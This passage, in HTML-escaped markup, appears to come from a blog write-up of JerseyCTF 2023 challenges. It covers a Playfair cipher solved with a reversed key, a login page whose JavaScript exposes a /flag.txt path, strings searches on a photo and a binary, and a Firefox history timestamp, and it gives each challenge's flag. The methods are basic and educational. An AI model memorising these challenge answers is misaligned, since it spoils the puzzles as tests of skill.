&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;Flag : jctf{onthemuddyriversnorthwestshore}&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;h1 id=&quot;play-reasonably&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#play-reasonably&quot; aria-label=&quot;Anchor link for: play-reasonably&quot;&gt;play-reasonably&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;jersey23&#x2F;jersey_play.png&quot; alt=&quot;playreasonably&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;This one is a special challenge. I spent more than an hour to solve this. And at the end of the ctf play-reasonably has only 11 solves.&lt;&#x2F;p&gt;
&lt;p&gt;Okay coming to challenge, I searched many keywords online but I havent find any thing positive. By observing carefully the ciphertext looks like it is from an old cipher. And I know about play-fair cipher. And they said play-reasonably and it matched with it. So, i started deciphering this playfair ciphertext.&lt;&#x2F;p&gt;
&lt;p&gt;Ciphertext : &lt;code&gt;WTATRHABWKYKACBMWD&lt;&#x2F;code&gt;&lt;br&gt;
I tried it with the key &lt;code&gt;THEBOYSAREBACKINTOWN&lt;&#x2F;code&gt; as the description highlighted it. I solved it with pen and paper as i know the working of playfair. Tried evry possible 5x5 key matrix.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;THEBOYSARCKINWDFGLMPQUVXZ (-J)&lt;&#x2F;code&gt;&lt;br&gt;&lt;code&gt;THEBOYSARCKINWDFGJLMPQUXZ (-V)&lt;&#x2F;code&gt;&lt;br&gt;
&lt;code&gt;THEBOYSARCKINWDFGJLMPUVXZ (-Q)&lt;&#x2F;code&gt;&lt;br&gt;&lt;code&gt;THEBOYSARCKINWDFGJLMPQUVX (-Z)&lt;&#x2F;code&gt;&lt;br&gt;
None of them are worked. So, I read the description again, They said &lt;code&gt;theboysarebackintown&lt;&#x2F;code&gt; are playing in reverse.&lt;br&gt; So, I tried the key matrix in reverse order. &lt;br&gt;
&lt;code&gt;NWOTIKCABERSYH&lt;&#x2F;code&gt; And the key matrix will be &lt;code&gt;NWOTIKCABERSYHDFGLMPQUVXZ (-J)&lt;&#x2F;code&gt;&lt;br&gt;&lt;&#x2F;p&gt;
&lt;p&gt;And I got the plaintext : &lt;code&gt;NOBODYCANCRACKTHIS&lt;&#x2F;code&gt;&lt;br&gt;
Here is my paper work might help you out.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;jersey23&#x2F;jersey_play1.jpeg&quot; alt=&quot;playreasonablypaper&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;You can use &lt;a href=&quot;https:&#x2F;&#x2F;www.dcode.fr&#x2F;playfair-cipher&quot; target=_blank&gt;this site&lt;&#x2F;a&gt; to decrypt or learn more about playfair ciper &lt;a href=&quot;https:&#x2F;&#x2F;www.geeksforgeeks.org&#x2F;playfair-cipher-with-examples&#x2F;&quot; target=_blank&gt;here&lt;&#x2F;a&gt;.&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;Flag : jctf{NOBODYCANCRACKTHIS}&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;hr &#x2F;&gt;
&lt;h1 id=&quot;web-look-im-hacking&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#web-look-im-hacking&quot; aria-label=&quot;Anchor link for: web-look-im-hacking&quot;&gt;Web - Look-Im-Hacking&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;jersey23&#x2F;jersey_lookim.png&quot; alt=&quot;look&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;A simple web challenge. The challenge url has the login page. I looked at the source code of it. And found this script.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;html&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-html &quot;&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;!&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;DOCTYPE &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;html&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;html &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;lang&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;en&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;head&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;meta &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;charset&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;UTF-8&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;meta &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;http-equiv&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;X-UA-Compatible&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;content&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;text&#x2F;html&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;meta &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;name&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;viewport&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;content&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;width=device-width, initial-scale=1.0&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;title&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;Document&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;title&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;script &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;type&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;text&#x2F;javascript&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;var &lt;&#x2F;span&gt;&lt;span&gt;passkey &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;createPass&lt;&#x2F;span&gt;&lt;span&gt;() {
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;const &lt;&#x2F;span&gt;&lt;span&gt;valids &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789$#@!&amp;amp;%&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;let &lt;&#x2F;span&gt;&lt;span&gt;i &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;; &lt;&#x2F;span&gt;&lt;span&gt;i &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;lt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;20&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;; &lt;&#x2F;span&gt;&lt;span&gt;i&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;++&lt;&#x2F;span&gt;&lt;span&gt;) {
&lt;&#x2F;span&gt;&lt;span&gt;                passkey &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+= &lt;&#x2F;span&gt;&lt;span&gt;valids&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;charAt&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#ed9366;&quot;&gt;Math&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;floor&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#ed9366;&quot;&gt;Math&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;random&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;* &lt;&#x2F;span&gt;&lt;span&gt;valids&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;length))
&lt;&#x2F;span&gt;&lt;span&gt;            }
&lt;&#x2F;span&gt;&lt;span&gt;            passkey &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;btoa&lt;&#x2F;span&gt;&lt;span&gt;(passkey)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;checkPass&lt;&#x2F;span&gt;&lt;span&gt;() {
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;console&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;log&lt;&#x2F;span&gt;&lt;span&gt;(passkey)
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;document&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;getElementById&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;un1&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;value &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;admin&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;amp;&amp;amp; &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;document&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;getElementById&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;pw2&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;value &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;atob&lt;&#x2F;span&gt;&lt;span&gt;(passkey)) {
&lt;&#x2F;span&gt;&lt;span&gt;                &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;loadFlag&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;            }
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;loadFlag&lt;&#x2F;span&gt;&lt;span&gt;() {
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;const &lt;&#x2F;span&gt;&lt;span&gt;xhttp &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;new &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;XMLHttpRequest&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;xhttp&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;onload &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span&gt;() {
&lt;&#x2F;span&gt;&lt;span&gt;                &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;document&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;getElementById&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;reveal&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;innerHTML &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;this&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;responseText&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;            }
&lt;&#x2F;span&gt;&lt;span&gt;            xhttp&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;open&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;GET&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;.&#x2F;flag.txt&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;            xhttp&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;send&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;script&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;head&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Found that there is a &lt;code&gt;&#x2F;flag.txt&lt;&#x2F;code&gt; end point. And simply curling it results the flag.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;sh&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-sh &quot;&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;mj0ln1r@Linux:&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;~&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;&#x2F;web$&lt;&#x2F;span&gt;&lt;span&gt; curl https:&#x2F;&#x2F;www.jerseyctf.online&#x2F;flag.txt
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span&gt;Hacker&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;amp;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;?r3@L$
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;Flag : jctf{$Hacker&amp;amp;?r3@L$}&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;hr &#x2F;&gt;
&lt;h1 id=&quot;forensics-unknown-origin&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#forensics-unknown-origin&quot; aria-label=&quot;Anchor link for: forensics-unknown-origin&quot;&gt;Forensics - unknown-origin&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;jersey23&#x2F;jersey_unknown.png&quot; alt=&quot;unknown&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;The challenge have this attached &lt;a href=&quot;&#x2F;assets&#x2F;files&#x2F;ctf_files&#x2F;jerseyctf23&#x2F;Photo.jpg&quot; download&gt;Photo.jpg&lt;&#x2F;a&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;Simple strings does the job.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;sh&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-sh &quot;&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;mj0ln1r@Linux:&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;~&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;&#x2F;forensics$&lt;&#x2F;span&gt;&lt;span&gt; strings Photo.jpg &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;| &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;grep&lt;&#x2F;span&gt;&lt;span&gt; jctf
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;jctf{0gre$&lt;&#x2F;span&gt;&lt;span&gt;_h&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;@ve_l@yers&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;Flag : jctf{0gre$_h@ve_l@yers}&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;h1 id=&quot;forensics-firefox-history&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#forensics-firefox-history&quot; aria-label=&quot;Anchor link for: forensics-firefox-history&quot;&gt;Forensics - firefox-history&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;jersey23&#x2F;jersey_firefox.png&quot; alt=&quot;firefox&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Attached file : &lt;a href=&quot;&#x2F;assets&#x2F;files&#x2F;ctf_files&#x2F;jerseyctf23&#x2F;places.sqlite&quot; download&gt;places.sqlite&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;So, i quickly searched for sqlite viewer online (I dont want to install additionally :) )&lt;&#x2F;p&gt;
&lt;p&gt;Found &lt;a href=&quot;https:&#x2F;&#x2F;inloop.github.io&#x2F;sqlite-viewer&#x2F;&quot; target=_blank&gt;this site&lt;&#x2F;a&gt; to view sqlite file.&lt;&#x2F;p&gt;
&lt;p&gt;As the file name hints places. So selected &lt;code&gt;moz_places&lt;&#x2F;code&gt; table to view.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;jersey23&#x2F;jersey_firefox1.png&quot; alt=&quot;firefox places&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;As the description said, i looked for the jerseyctf.com entry in the table. It was on 137th row.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;jersey23&#x2F;jersey_firefox2.png&quot; alt=&quot;firefox jersey&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;I copied the last time visited value of the 137th entry. As the flag format is &lt;code&gt;jctf{YYYY-MM-DD-HH-MM-SS}&lt;&#x2F;code&gt; of this time, I used a seconds to epoch converter to get this format.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;1674907264007000&lt;&#x2F;code&gt; to epoch on &lt;a href=&quot;https:&#x2F;&#x2F;www.epochconverter.com&#x2F;&quot; target=_blank&gt; this site &lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;jersey23&#x2F;jersey_firefox3.png&quot; alt=&quot;firefox epoch&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;And the correct format is the date in GMT that is &lt;code&gt;2023-01-28-12-01-04&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;Flag : jctf{2023-01-28-12-01-04}&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;hr &#x2F;&gt;
&lt;h1 id=&quot;bin-plain&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#bin-plain&quot; aria-label=&quot;Anchor link for: bin-plain&quot;&gt;bin - plain&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;jersey23&#x2F;jersey_plain.png&quot; alt=&quot;plain&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;The challenge has bin executable named &lt;code&gt;plain&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;p&gt;strings done the job for us again.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;sh&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-sh &quot;&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;mj0ln1r@Linux:&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;~&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;&#x2F;forensics$&lt;&#x2F;span&gt;&lt;span&gt; strings plain &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;| &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;grep&lt;&#x2F;span&gt;&lt;span&gt; jctf
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;jctf{i_&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;3&lt;&#x2F;span&gt;&lt;span&gt;_5tr1Ng5_59af0c0ed}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;blockquote&gt;
